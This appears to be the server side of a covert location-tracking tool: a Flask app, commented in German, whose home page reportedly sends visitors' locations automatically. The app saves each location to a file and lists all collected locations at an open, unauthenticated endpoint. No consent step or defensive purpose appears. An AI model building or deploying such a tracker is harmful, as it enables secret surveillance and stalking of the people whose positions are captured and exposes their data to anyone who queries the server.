from flask import Flask, request, render_template, jsonify
import os
import json
from datetime import datetime

app = Flask(__name__)

# Speicherordner
LOC_DIR = "locations"
os.makedirs(LOC_DIR, exist_ok=True)

# 🔥 Startseite (sendet automatisch Standort)
@app.route("/")
def index():
    return render_template("index.html")

# 📍 Standort speichern
@app.route("/save_location", methods=["POST"])
def save_location():
    data = request.json

    if not data:
        return "Keine Daten", 400

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(LOC_DIR, f"standort_{timestamp}.json")

    with open(filename, "w") as f:
        json.dump(data, f)

    print("NEUER STANDORT:", data)

    return "OK"

# 👀 Alle Standorte anzeigen (wichtig!)
@app.route("/locations")
def locations():
    all_locations = []

    for file in os.listdir(LOC_DIR):
        path = os.path.join(LOC_DIR, file)
        with open(path, "r") as f:
            data = json.load(f)
            all_locations.append(data)

    return jsonify(all_locations)

# 🚀 Start
if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)